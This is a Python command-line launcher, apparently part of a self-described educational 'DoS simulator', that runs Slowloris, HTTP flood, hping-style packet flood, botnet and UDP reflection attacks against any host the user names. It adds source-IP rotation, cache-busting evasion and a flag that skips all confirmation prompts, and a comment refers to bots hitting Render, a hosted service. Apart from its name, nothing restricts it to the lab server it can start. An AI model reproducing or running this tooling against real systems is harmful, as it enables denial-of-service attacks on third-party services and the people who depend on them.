import os
import subprocess
import argparse
import sys

# Educational Network Security System Wrapper (DoS Simulator)
# Use this tool to manage and run educational simulations.

class SecuritySystem:
    def __init__(self, tools_dir, auto_approve=False):
        self.tools_dir = tools_dir
        self.python_dir = os.path.join(tools_dir, "python")
        self.cpp_dir = os.path.join(tools_dir, "cpp")
        self.auto_approve = auto_approve

    def get_public_ip(self):
        print("\n[*] Fetching external (Public) IP address...")
        import urllib.request
        try:
            # Using icanhazip.com for a clean IP response
            with urllib.request.urlopen("https://icanhazip.com", timeout=5) as response:
                ip = response.read().decode('utf-8').strip()
                print(f"[+] Your Public IP Address: {ip}")
                print("[!] NOTE: All bots in your lab likely share this single IP when hitting Render.")
                return ip
        except Exception as e:
            print(f"[!] Could not fetch public IP: {e}")
            return None

    def get_local_ips(self):
        print("\n[*] Discovering local network interfaces...")
        import socket
        interfaces = []
        try:
            host_name = socket.gethostname()
            ip_list = socket.gethostbyname_ex(host_name)[2]
            for ip in ip_list:
                interfaces.append(ip)
        except Exception as e:
            print(f"[!] Error discovering IPs: {e}")
        
        if not interfaces:
            print("[!] No active IP addresses found.")
        else:
            print("[+] Found available local IPs:")
            for ip in interfaces:
                print(f"    - {ip}")
        return interfaces

    def run_lab_server(self):
        print("\n[*] STARTING VULNERABLE LAB SERVER...")
        script_path = os.path.join(self.python_dir, "vuln_server.py")
        try:
            subprocess.run([sys.executable, script_path])
        except KeyboardInterrupt:
            print("\n[*] Lab Server Stopped.")

    def run_slowloris(self, host, port, sockets, ips=None, path="/", cache_bust=False, flood=False):
        mode_name = "HTTP FLOOD" if flood else "Slowloris"
        print(f"\n[!] WARNING: Initiating educational {mode_name} simulation against {host}:{port}")
        if path != "/":
            print(f"[*] Targeting specific path: {path}")
        if cache_bust:
            print("[*] Cache Busting: ENABLED")
        if flood:
            print("[*] Volumetric Mode: ENABLED (Maximum Frequency)")
            
        if not self.auto_approve:
            confirm = input("[?] Proceed for educational purposes? (y/n): ")
            if confirm.lower() != 'y': return
        
        script_path = os.path.join(self.python_dir, "slowloris_sim.py")
        cmd = [sys.executable, "-u", script_path, host, "-p", str(port), "-s", str(sockets)]
        if ips: cmd.extend(["--ips", ips])
        if path: cmd.extend(["--path", path])
        if cache_bust: cmd.append("--cache-bust")
        if flood: cmd.append("--flood")
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\n[*] Stopping simulation...")

    def run_botnet(self, target, port, bots, ips, tool, rotate=False, flood=False):
        print(f"\n[!] WARNING: Initiating educational Botnet simulation against {target}:{port}")
        print(f"[*] Bots: {bots}, Tool: {tool}, Rotation: {rotate}, Flood: {flood}")
        if not self.auto_approve:
            confirm = input("[?] Proceed for educational purposes? (y/n): ")
            if confirm.lower() != 'y': return
        
        script_path = os.path.join(self.python_dir, "botnet_sim.py")
        cmd = [sys.executable, script_path, target, "-p", str(port), "-b", str(bots), "--ips", ips, "--tool", tool]
        if rotate:
            cmd.append("--rotate")
        if flood:
            cmd.append("--flood")
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\n[*] Stopping botnet orchestration...")

    def run_hping_lite(self, host, port, mode, ips=None, rotate=False, flood=False):
        print(f"\n[!] WARNING: Initiating educational Packet Crafting simulation against {host}:{port}")
        if rotate:
            print("[*] 1-Second IP Rotation Service: ENABLED")
        if flood:
            print("[!] FLOOD MODE: ENABLED")
        if not self.auto_approve:
            confirm = input("[?] Proceed for educational purposes? (y/n): ")
            if confirm.lower() != 'y': return

        # We use the Python version for advanced rotation/flood logic
        script_path = os.path.join(self.python_dir, "hping_lite.py")
        cmd = [sys.executable, "-u", script_path, host, str(port), mode]
        if ips: cmd.extend(["--ips", ips])
        if rotate: cmd.append("--continuous")
        if flood: cmd.append("--flood")
        
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\n[*] Stopping simulation...")

    def run_reflection(self, target, reflector, port):
        print(f"\n[!] WARNING: Initiating educational UDP Reflection simulation")
        print(f"[*] Target: {target}, Reflector: {reflector}:{port}")
        if not self.auto_approve:
            confirm = input("[?] Proceed for educational purposes? (y/n): ")
            if confirm.lower() != 'y': return

        script_path = os.path.join(self.python_dir, "udp_reflector_sim.py")
        cmd = [sys.executable, script_path, target, reflector, "-p", str(port)]
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\n[*] Stopping simulation...")

def main():
    parser = argparse.ArgumentParser(description="Educational Network Security System")
    parser.add_argument("-y", "--yes", action="store_true", help="Auto-approve all confirmation prompts")
    subparsers = parser.add_subparsers(dest="command")

    # Slowloris sub-command
    slow_parser = subparsers.add_parser("slowloris", help="Run Slowloris simulation")
    slow_parser.add_argument("host", help="Target host")
    slow_parser.add_argument("-p", "--port", type=int, default=80)
    slow_parser.add_argument("-s", "--sockets", type=int, default=150)
    slow_parser.add_argument("--ips", help="Comma-separated list of source IPs")
    slow_parser.add_argument("--path", default="/", help="Specific path to target")
    slow_parser.add_argument("--cache-bust", action="store_true", help="Enable random query string evasion")
    slow_parser.add_argument("--flood", action="store_true", help="Enable Volumetric HTTP Flood")

    # hping-lite sub-command
    hping_parser = subparsers.add_parser("hping", help="Run hping-lite simulation")
    hping_parser.add_argument("host", help="Target host")
    hping_parser.add_argument("port", type=int)
    hping_parser.add_argument("mode", choices=["tcp", "udp"])
    hping_parser.add_argument("--ips", help="Source IP to use (takes first if multiple provided)")
    hping_parser.add_argument("--rotate", action="store_true", help="Rotate source IPs every 1 second")
    hping_parser.add_argument("--flood", action="store_true", help="Send packets as fast as possible (Volumetric)")

    # Botnet sub-command
    bot_parser = subparsers.add_parser("botnet", help="Run Botnet simulation")
    bot_parser.add_argument("target", help="Target host")
    bot_parser.add_argument("-p", "--port", type=int, default=80)
    bot_parser.add_argument("-b", "--bots", type=int, default=3)
    bot_parser.add_argument("--ips", help="Comma-separated source IP pool", required=True)
    bot_parser.add_argument("--tool", choices=["slowloris", "hping"], default="slowloris")
    bot_parser.add_argument("--rotate", action="store_true", help="Tell bots to rotate through their assigned IPs")
    bot_parser.add_argument("--flood", action="store_true", help="Tell bots to send packets as fast as possible")

    # Reflection sub-command
    ref_parser = subparsers.add_parser("reflection", help="Run UDP Reflection simulation")
    ref_parser.add_argument("target", help="Target Victim IP")
    ref_parser.add_argument("reflector", help="Reflector IP")
    ref_parser.add_argument("-p", "--port", type=int, default=53)

    # Discover sub-command
    subparsers.add_parser("discover", help="Discover available local IP addresses")

    # IP Info sub-command
    subparsers.add_parser("ip-info", help="Fetch your Public IP address")

    # Lab Server sub-command
    subparsers.add_parser("lab-server", help="Start the vulnerable lab server for testing")

    args = parser.parse_args()

    tools_dir = os.path.dirname(os.path.abspath(__file__))
    system = SecuritySystem(tools_dir, auto_approve=args.yes)

    if args.command == "slowloris":
        system.run_slowloris(args.host, args.port, args.sockets, args.ips, args.path, args.cache_bust, args.flood)
    elif args.command == "hping":
        system.run_hping_lite(args.host, args.port, args.mode, args.ips, args.rotate, args.flood)
    elif args.command == "botnet":
        system.run_botnet(args.target, args.port, args.bots, args.ips, args.tool, args.rotate, args.flood)
    elif args.command == "reflection":
        system.run_reflection(args.target, args.reflector, args.port)
    elif args.command == "discover":
        system.get_local_ips()
    elif args.command == "ip-info":
        system.get_public_ip()
    elif args.command == "lab-server":
        system.run_lab_server()
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
